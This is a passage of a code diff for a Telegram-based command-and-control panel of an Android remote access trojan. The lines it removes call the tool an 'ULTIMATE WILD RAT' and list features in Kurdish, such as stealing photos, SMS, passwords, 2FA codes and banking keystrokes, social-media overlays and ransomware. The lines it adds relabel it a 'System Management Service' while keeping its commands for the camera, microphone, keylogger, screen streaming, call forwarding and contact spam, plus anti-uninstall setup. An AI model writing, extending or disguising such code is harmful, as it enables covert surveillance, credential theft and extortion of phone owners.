-        '📊 **ئامار** - ئامارەکانی سیستەم\n' +
-        '⚡ **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان\n' +
-        '📱 **نۆتیفیکەیشن** - بینینی نۆتیفیکەیشنە دزراوەکان\n' +
-        '📹 **Stream** - بینینی Streamە چالاکەکان\n' +
-        '⌨️ **Keylogs** - بینینی کێڤلۆگەکان\n' +
-        '🔧 **Advanced** - فەرمانە پێشکەوتووەکان',
+        '🔴 **System Management Service**\n\n' +
+        '✅ Ready\n\n' +
+        '📱 **devices** - Show connected devices\n' +
+        '📊 **stats** - System statistics\n' +
+        '⚡ **commands** - Available commands',
         {
             reply_markup: {
                 keyboard: [
-                    ['📱 ئامێرەکان', '📊 ئامار'],
-                    ['⚡ فەرمانەکان', '📱 نۆتیفیکەیشن'],
-                    ['📹 Stream', '⌨️ Keylogs'],
-                    ['🔧 Advanced']
+                    ['📱 devices', '📊 stats'],
+                    ['⚡ commands']
                 ],
                 resize_keyboard: true
             }
@@ -1534,110 +1767,45 @@ bot.onText(/\/start/, (msg) => {
     );
 });
 
-bot.onText(/📱 نۆتیفیکەیشن/, (msg) => {
+bot.onText(/📱 devices/, (msg) => {
     if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
     
-    const notifications = notificationListener.getNotifications().slice(-10).reverse();
-    
-    if (notifications.length === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '📭 **هیچ نۆتیفیکەیشنێک نەدزراوە**');
+    if (clients.size === 0) {
+        bot.sendMessage(CONFIG.CHAT_ID, '❌ No devices connected');
         return;
     }
     
-    let text = '📱 **دوایین نۆتیفیکەیشنەکان**\n\n';
-    notifications.forEach((n, i) => {
-        text += `${i+1}. **${n.app}**\n`;
-        text += `   📌 ${n.title}\n`;
-        text += `   📝 ${n.text}\n`;
-        text += `   ⏰ ${new Date(n.timestamp).toLocaleTimeString()}\n\n`;
+    let text = '📱 **Connected Devices**\n\n';
+    clients.forEach((client, id) => {
+        text += `📱 **Model:** ${client.info.manufacturer} ${client.info.model}\n` +
+                `🔋 **Battery:** ${client.info.battery}\n` +
+                `🆔 **ID:** ${id.substring(0, 8)}...\n\n`;
     });
     
     bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
 });
 
-bot.onText(/📹 Stream/, (msg) => {
+bot.onText(/📊 stats/, (msg) => {
     if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
     
-    const streams = screenStreamer.getActiveStreams();
-    
-    if (streams.length === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '📹 **هیچ Streamێک چالاک نییە**');
-        return;
-    }
-    
-    let text = '📹 **Streamە چالاکەکان**\n\n';
-    streams.forEach((s, i) => {
-        const duration = Math.floor((Date.now() - new Date(s.startedAt)) / 1000);
-        text += `${i+1}. **Client:** ${s.clientId.substring(0, 8)}...\n`;
-        text += `   📊 Frames: ${s.frames}\n`;
-        text += `   ⏱️ Duration: ${duration}s\n`;
-        text += `   🆔 Stream: ${s.id.substring(0, 8)}...\n\n`;
-    });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/⌨️ Keylogs/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    const logs = smartKeylogger.getLogs().slice(-20).reverse();
-    const bankingLogs = smartKeylogger.getBankingLogs();
-    
-    if (logs.length === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '⌨️ **هیچ کێڤلۆگێک نەتۆمارکراوە**');
-        return;
-    }
-    
-    let text = '⌨️ **دوایین کێڤلۆگەکان**\n\n';
-    logs.forEach((l, i) => {
-        text += `${i+1}. **${l.app}** ${l.isSensitive ? '💰' : ''}\n`;
-        text += `   ⌨️ ${l.key}\n`;
-        text += `   ⏰ ${new Date(l.timestamp).toLocaleTimeString()}\n\n`;
-    });
-    
-    text += `💰 **Banking Logs:** ${bankingLogs.length}`;
-    
-    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/🔧 Advanced/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
+    const db = readDB();
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        '🔧 **Advanced Control Panel**\n\n' +
-        '📊 **Device Control**\n' +
-        '   /lock_screen - قوفڵکردنی شاشە\n' +
-        '   /wake_up - هەستانەوەی شاشە\n' +
-        '   /keep_screen - شاشە بەردەوام بێت\n' +
-        '   /rename_device - گۆڕینی ناوی ئامێر\n\n' +
-        '📞 **Call Control**\n' +
-        '   /forward_calls - گواستنەوەی پەیوەندی\n' +
-        '   /stop_forward - وەستاندنی گواستنەوە\n\n' +
-        '📨 **Message Control**\n' +
-        '   /spam_contacts - ناردنی نامە بۆ هەموو کۆنتاکتەکان\n' +
-        '   /block_app - بلۆکی ئەپێک\n' +
-        '   /kill_app - وەستاندنی ئەپێک\n\n' +
-        '📶 **Network Control**\n' +
-        '   /wifi_on - وایفای داگیرسێنە\n' +
-        '   /wifi_off - وایفای بکوژێنە\n' +
-        '   /bluetooth_on - بلوتوس داگیرسێنە\n' +
-        '   /bluetooth_off - بلوتوس بکوژێنە\n\n' +
-        '💥 **Danger Zone**\n' +
-        '   /self_destruct - لەناوبردنی هەموو شتێک',
+        `📊 **System Statistics**\n\n` +
+        `📱 Connected Devices: ${clients.size}\n` +
+        `📸 Total Snapshots: ${db.stats.cam_snapshots || 0}\n` +
+        `📱 Notifications: ${db.stats.notifications_captured || 0}\n` +
+        `📹 Active Streams: ${screenStreamer.activeStreams}\n` +
+        `⏱️ Uptime: ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
         { parse_mode: 'Markdown' }
     );
 });
 
-// =====================================================
-// 🎯 COMMAND HANDLERS
-// =====================================================
-
-// Wake up screen
-bot.onText(/\/wake_up/, (msg) => {
+bot.onText(/⚡ commands/, (msg) => {
     if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
     
     if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
+        bot.sendMessage(CONFIG.CHAT_ID, '❌ No devices connected');
         return;
     }
     
@@ -1645,190 +1813,17 @@ bot.onText(/\/wake_up/, (msg) => {
     clients.forEach((client, id) => {
         deviceKeyboard.push([{
             text: `${client.info.manufacturer} ${client.info.model}`,
-            callback_data: `wake:${id}`
+            callback_data: `device:${id}`
         }]);
     });
     
-    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ هەستانەوەی شاشە**', {
-        reply_markup: { inline_keyboard: deviceKeyboard }
-    });
-});
-
-// Keep screen on
-bot.onText(/\/keep_screen/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    const deviceKeyboard = [];
-    clients.forEach((client, id) => {
-        deviceKeyboard.push([{
-            text: `${client.info.manufacturer} ${client.info.model}`,
-            callback_data: `keep_screen:${id}`
-        }]);
-    });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ بەردەوام بوونی شاشە**', {
-        reply_markup: { inline_keyboard: deviceKeyboard }
-    });
-});
-
-// Rename device
-bot.onText(/\/rename_device/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        '📝 **ناوی نوێ بنووسە بۆ ئامێرەکە**',
-        { reply_markup: { force_reply: true } }
-    );
-});
-
-// Forward calls
-bot.onText(/\/forward_calls/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        '📞 **ژمارە تەلەفۆن بنووسە بۆ گواستنەوەی پەیوەندی**\n\n' +
-        'نموونە: +964**********',
-        { reply_markup: { force_reply: true } }
-    );
-});
-
-// Spam contacts
-bot.onText(/\/spam_contacts/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        '📝 **پەیامەکە بنووسە بۆ ناردن بە هەموو کۆنتاکتەکان**',
-        { reply_markup: { force_reply: true } }
-    );
-});
-
-// Self destruct
-bot.onText(/\/self_destruct/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        '💥 **⚠️⚠️⚠️ SELF-DESTRUCT ⚠️⚠️⚠️**\n\n' +
-        'ئەم فەرمانە هەموو داتاکان لەناودەبات\n\n' +
-        'بۆ پشتڕاستکردنەوە، ئەم پاسۆردە بنووسە:',
-        { reply_markup: { force_reply: true } }
-    );
-});
-
-// WiFi on
-bot.onText(/\/wifi_on/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    const deviceKeyboard = [];
-    clients.forEach((client, id) => {
-        deviceKeyboard.push([{
-            text: `${client.info.manufacturer} ${client.info.model}`,
-            callback_data: `wifi_on:${id}`
-        }]);
-    });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ داگیرساندنی وایفای**', {
-        reply_markup: { inline_keyboard: deviceKeyboard }
-    });
-});
-
-// WiFi off
-bot.onText(/\/wifi_off/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    const deviceKeyboard = [];
-    clients.forEach((client, id) => {
-        deviceKeyboard.push([{
-            text: `${client.info.manufacturer} ${client.info.model}`,
-            callback_data: `wifi_off:${id}`
-        }]);
-    });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ کوژاندنەوەی وایفای**', {
-        reply_markup: { inline_keyboard: deviceKeyboard }
-    });
-});
-
-// Bluetooth on
-bot.onText(/\/bluetooth_on/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    const deviceKeyboard = [];
-    clients.forEach((client, id) => {
-        deviceKeyboard.push([{
-            text: `${client.info.manufacturer} ${client.info.model}`,
-            callback_data: `bluetooth_on:${id}`
-        }]);
-    });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ داگیرساندنی بلوتوس**', {
-        reply_markup: { inline_keyboard: deviceKeyboard }
-    });
-});
-
-// Bluetooth off
-bot.onText(/\/bluetooth_off/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    const deviceKeyboard = [];
-    clients.forEach((client, id) => {
-        deviceKeyboard.push([{
-            text: `${client.info.manufacturer} ${client.info.model}`,
-            callback_data: `bluetooth_off:${id}`
-        }]);
-    });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ کوژاندنەوەی بلوتوس**', {
+    bot.sendMessage(CONFIG.CHAT_ID, '📱 **Select a device**', {
         reply_markup: { inline_keyboard: deviceKeyboard }
     });
 });
 
 // =====================================================
-// 🔘 CALLBACK QUERY HANDLER (UPDATED)
+// 🔘 CALLBACK QUERY HANDLER
 // =====================================================
 bot.on('callback_query', (callbackQuery) => {
     const msg = callbackQuery.message;
@@ -1837,7 +1832,7 @@ bot.on('callback_query', (callbackQuery) => {
     if (command === 'device') {
         const client = clients.get(clientId);
         if (!client) {
-            bot.editMessageText('❌ ئامێرەکە پەیوەندی پچڕاند', {
+            bot.editMessageText('❌ Device disconnected', {
                 chat_id: msg.chat.id,
                 message_id: msg.message_id
             });
@@ -1846,135 +1841,50 @@ bot.on('callback_query', (callbackQuery) => {
         
         bot.editMessageText(
             `📱 **${client.info.manufacturer} ${client.info.model}**\n\n` +
-            `📱 **ئەندرۆید:** ${client.info.androidVersion}\n` +
-            `🔋 **پاتری:** ${client.info.battery}\n` +
-            `💾 **RAM:** ${client.info.ram}\n` +
-            `📁 **Storage:** ${client.info.storage}\n` +
-            `🔓 **Root:** ${client.info.root}\n` +
-            `🌍 **وڵات:** ${client.info.country}\n` +
-            `📡 **کەریەر:** ${client.info.carrier}\n` +
-            `🌐 **IP:** ${client.info.ip}\n` +
-            `🕐 **پەیوەست بوو:** ${new Date(client.info.connectedAt).toLocaleString()}\n\n` +
-            `**⚡ فەرمانێک هەڵبژێرە:**`,
+            `📱 Android: ${client.info.androidVersion}\n` +
+            `🔋 Battery: ${client.info.battery}\n` +
+            `🌍 Country: ${client.info.country}\n` +
+            `🌐 IP: ${client.info.ip}\n\n` +
+            `**Select command:**`,
             {
                 chat_id: msg.chat.id,
                 message_id: msg.message_id,
                 reply_markup: {
                     inline_keyboard: [
-                        // Basic Commands
                         [
-                            { text: '📸 وێنەی پشت', callback_data: `camera_back:${clientId}` },
-                            { text: '🤳 وێنەی پێش', callback_data: `camera_front:${clientId}` }
+                            { text: '📸 Camera', callback_data: `camera:${clientId}` },
+                            { text: '🎤 Microphone', callback_data: `mic:${clientId}` }
                         ],
                         [
-                            { text: '📹 ڤیدیۆی پشت', callback_data: `video_back:${clientId}` },
-                            { text: '🎥 ڤیدیۆی پێش', callback_data: `video_front:${clientId}` }
+                            { text: '📍 Location', callback_data: `location:${clientId}` },
+                            { text: '📁 Files', callback_data: `files:${clientId}` }
                         ],
                         [
-                            { text: '📸 دزینی وێنەکان', callback_data: `get_photos:${clientId}` },
-                            { text: '📹 دزینی ڤیدیۆکان', callback_data: `get_videos:${clientId}` }
+                            { text: '📱 Notifications', callback_data: `notifications:${clientId}` },
+                            { text: '⌨️ Keylogger', callback_data: `keylogger:${clientId}` }
                         ],
                         [
-                            { text: '📸 سکرین شۆت', callback_data: `screenshot:${clientId}` },
-                            { text: '📹 تۆماری شاشە', callback_data: `screen_record:${clientId}` }
+                            { text: '📹 Screen Stream', callback_data: `screen:${clientId}` },
+                            { text: '📸 Cam Snapshot', callback_data: `cam_snapshot:${clientId}` }
                         ],
                         [
-                            { text: '📹 Screen Stream', callback_data: `screen_stream:${clientId}` },
-                            { text: '⏹️ Stop Stream', callback_data: `stop_stream:${clientId}` }
-                        ],
-                        [
-                            { text: '🎤 تۆماری دەنگ', callback_data: `microphone:${clientId}` },
-                            { text: '📞 تۆماری پەیوەندی', callback_data: `call_record:${clientId}` }
-                        ],
-                        
-                        // Data Extraction
-                        [
-                            { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${clientId}` },
-                            { text: '📋 کلیپبۆرد', callback_data: `clipboard:${clientId}` }
-                        ],
-                        [
-                            { text: '📍 شوێن', callback_data: `location:${clientId}` },
-                            { text: '👥 کۆنتاکتەکان', callback_data: `contacts:${clientId}` }
-                        ],
-                        [
-                            { text: '📞 پەیوەندییەکان', callback_data: `calls:${clientId}` },
-                            { text: '📨 SMS', callback_data: `sms:${clientId}` }
-                        ],
-                        [
-                            { text: '🔐 OTP', callback_data: `otp:${clientId}` },
-                            { text: '📤 ناردنی SMS', callback_data: `send_sms:${clientId}` }
-                        ],
-                        
-                        // Advanced Features
-                        [
-                            { text: '📱 Start Notifications', callback_data: `start_notifications:${clientId}` },
-                            { text: '📱 Stop Notifications', callback_data: `stop_notifications:${clientId}` }
-                        ],
-                        [
-                            { text: '⌨️ Start Smart Keylogger', callback_data: `start_smart_keylogger:${clientId}` },
-                            { text: '⌨️ Stop Smart Keylogger', callback_data: `stop_smart_keylogger:${clientId}` }
-                        ],
-                        [
-                            { text: '🎭 Facebook Overlay', callback_data: `overlay_facebook:${clientId}` },
-                            { text: '🎭 Instagram Overlay', callback_data: `overlay_instagram:${clientId}` }
-                        ],
-                        
-                        // Apps & Passwords
-                        [
-                            { text: '📱 ئەپەکان', callback_data: `apps:${clientId}` },
-                            { text: '🔑 پاسۆردەکان', callback_data: `passwords:${clientId}` }
-                        ],
-                        [
-                            { text: '🔐 2FA', callback_data: `twofa:${clientId}` },
-                            { text: '📧 Gmail', callback_data: `gmail:${clientId}` }
-                        ],
-                        
-                        // Crypto & Ransomware
-                        [
-                            { text: '💳 Crypto', callback_data: `crypto:${clientId}` },
-                            { text: '💣 ڕانسۆمویر', callback_data: `ransomware:${clientId}` }
-                        ],
-                        
-                        // File System
-                        [
-                            { text: '📁 فایلەکان', callback_data: `files:${clientId}` },
-                            { text: '📂 وەرگرتنی فایل', callback_data: `download_file:${clientId}` }
-                        ],
-                        
-                        // Advanced Control
-                        [
-                            { text: '🔓 Admin', callback_data: `admin:${clientId}` },
-                            { text: '❄️ Freeze', callback_data: `freeze:${clientId}` }
-                        ],
-                        [
-                            { text: '🚫 Hide Icon', callback_data: `hide_icon:${clientId}` },
-                            { text: '🔄 Update', callback_data: `update:${clientId}` }
-                        ],
-                        
-                        // New Advanced Features
-                        [
-                            { text: '🔓 Wake Up', callback_data: `wake:${clientId}` },
-                            { text: '🔒 Keep Screen', callback_data: `keep_screen:${clientId}` }
-                        ],
-                        [
-                            { text: '📞 Forward Calls', callback_data: `forward_calls:${clientId}` },
-                            { text: '📨 Spam Contacts', callback_data: `spam_contacts:${clientId}` }
-                        ],
-                        [
-                            { text: '🛑 Kill App', callback_data: `kill_app:${clientId}` },
-                            { text: '🚫 Block App', callback_data: `block_app:${clientId}` }
+                            { text: '📞 Forward Calls', callback_data: `forward:${clientId}` },
+                            { text: '📨 Spam', callback_data: `spam:${clientId}` }
                         ],
                         [
                             { text: '📶 WiFi On', callback_data: `wifi_on:${clientId}` },
                             { text: '📶 WiFi Off', callback_data: `wifi_off:${clientId}` }
                         ],
                         [
-                            { text: '📱 Bluetooth On', callback_data: `bluetooth_on:${clientId}` },
-                            { text: '📱 Bluetooth Off', callback_data: `bluetooth_off:${clientId}` }
+                            { text: '📱 Bluetooth On', callback_data: `bt_on:${clientId}` },
+                            { text: '📱 Bluetooth Off', callback_data: `bt_off:${clientId}` }
                         ],
                         [
-                            { text: '💥 Self Destruct', callback_data: `self_destruct:${clientId}` },
-                            { text: 'ℹ️ Info', callback_data: `info:${clientId}` }
+                            { text: '🔓 Wake Up', callback_data: `wake:${clientId}` },
+                            { text: '🔒 Keep Screen', callback_data: `keep_screen:${clientId}` }
+                        ],
+                        [
+                            { text: '💥 Self Destruct', callback_data: `destruct:${clientId}` }
                         ]
                     ]
                 },
@@ -1983,24 +1893,22 @@ bot.on('callback_query', (callbackQuery) => {
         );
     }
     
-    // Handle new advanced commands
-    const advancedCommands = [
-        'wake', 'keep_screen', 'forward_calls', 'spam_contacts',
-        'kill_app', 'block_app', 'wifi_on', 'wifi_off',
-        'bluetooth_on', 'bluetooth_off', 'self_destruct'
+    const commandTypes = [
+        'camera', 'mic', 'location', 'files', 'notifications',
+        'keylogger', 'screen', 'cam_snapshot', 'forward', 'spam',
+        'wifi_on', 'wifi_off', 'bt_on', 'bt_off', 'wake', 'keep_screen'
     ];
     
-    if (advancedCommands.includes(command)) {
+    if (commandTypes.includes(command)) {
         const client = clients.get(clientId);
         if (!client) {
             bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
+                text: '❌ Device disconnected',
                 show_alert: true
             });
             return;
         }
         
-        // Send command via WebSocket
         if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: command,
@@ -2014,17 +1922,25 @@ bot.on('callback_query', (callbackQuery) => {
             
             bot.sendMessage(CONFIG.CHAT_ID,
                 `✅ **Command Sent**\n\n` +
-                `📱 Client: ${client.info.manufacturer} ${client.info.model}\n` +
+                `📱 Device: ${client.info.manufacturer} ${client.info.model}\n` +
                 `⚡ Command: ${command}\n` +
                 `🕐 Time: ${new Date().toLocaleString()}`,
                 { parse_mode: 'Markdown' }
             );
         } else {
             bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
+                text: '❌ Connection lost',
                 show_alert: true
             });
         }
+    }
+    
+    if (command === 'destruct') {
+        bot.sendMessage(CONFIG.CHAT_ID,
+            '💥 **⚠️ SELF-DESTRUCT ⚠️**\n\n' +
+            'Enter password to confirm:',
+            { reply_markup: { force_reply: true } }
+        );
     }
 });
 
@@ -2037,48 +1953,30 @@ setInterval(() => {
             ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
         }
     });
-    
-    // Keep Railway alive
-    axios.get(`https://${process.env.RAILWAY_STATIC_URL || 'localhost'}:${CONFIG.PORT}`).catch(() => {});
 }, CONFIG.PING_INTERVAL);
+
+// =====================================================
+// 🚀 INSTALL ALL MODULES
+// =====================================================
+setupAutoRestart();
+setupPersistentService();
+setupAccessibilityService();
+setupBatteryOptimizationBypass();
+setupAntiUninstall();
 
 // =====================================================
 // 🚀 START SERVER
 // =====================================================
 server.listen(CONFIG.PORT, '0.0.0.0', () => {
-    console.log(`✅ 7ASHASHE V38 running on port ${CONFIG.PORT}`);
+    console.log(`✅ Server running on port ${CONFIG.PORT}`);
     console.log(`🌐 http://localhost:${CONFIG.PORT}`);
-    console.log(`🔥 ULTIMATE WILD RAT - ${CONFIG.MASTER}`);
-    console.log(`🔒 Encryption: AES-256-CBC`);
-    console.log(`📁 Data directory: ${DIRS.DATA}`);
-    
-    // Install all modules
-    setupAutoRestart();
-    setupBatteryOptimizationBypass();
-    setupAntiUninstall();
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        `🔥 **7ASHASHE V38 - ULTIMATE WILD RAT**\n\n` +
-        `👑 **Master: ${CONFIG.MASTER}**\n` +
-        `📊 وەشان: ${CONFIG.VERSION}\n` +
-        `🌐 پۆرت: ${CONFIG.PORT}\n` +
-        `🖥️ Platform: ${os.platform()}\n` +
-        `⏱️ Start Time: ${new Date().toLocaleString()}\n\n` +
-        `✅ **تایبەتمەندییەکان:**\n` +
-        `• دزینی وێنە و ڤیدیۆ و دەنگ\n` +
-        `• کۆنترۆڵی کامێرا و مایکرۆفۆن\n` +
-        `• کێڤلۆگەر و کلیپبۆرد\n` +
-        `• دزینی کۆنتاکت و SMS و پەیوەندی\n` +
-        `• دزینی پاسۆرد و 2FA\n` +
-        `• دزینی ئەپەکانی سۆشیاڵ میدیا\n` +
-        `• ڕانسۆمویر\n` +
-        `• پەیوەندی ئینکریپتکراو\n` +
-        `• Auto-Restart & Battery Bypass\n` +
-        `• Anti-Uninstall & Lock Screen Bypass\n` +
-        `• Call Forwarding & Contacts Spam\n` +
-        `• App Killer & WiFi/Bluetooth Control\n` +
-        `• Self-Destruct & Screen Stream\n\n` +
-        `🦁 **7ASHASHE**`
+        `✅ **System Management Service Started**\n\n` +
+        `📊 Version: ${CONFIG.VERSION}\n` +
+        `🌐 Port: ${CONFIG.PORT}\n` +
+        `⏱️ Time: ${new Date().toLocaleString()}\n\n` +
+        `🦁 **Ready**`
     );
 });
 
@@ -2087,16 +1985,8 @@ server.listen(CONFIG.PORT, '0.0.0.0', () => {
 // =====================================================
 process.on('uncaughtException', (error) => {
     console.error('Uncaught Exception:', error);
-    bot.sendMessage(CONFIG.CHAT_ID,
-        `⚠️ **Uncaught Exception**\n\n${error.message}`,
-        { parse_mode: 'Markdown' }
-    );
 });
 
 process.on('unhandledRejection', (reason, promise) => {
     console.error('Unhandled Rejection:', reason);
-    bot.sendMessage(CONFIG.CHAT_ID,
-        `⚠️ **Unhandled Rejection**\n\n${reason}`,
-        { parse_mode: 'Markdown' }
-    );
 });
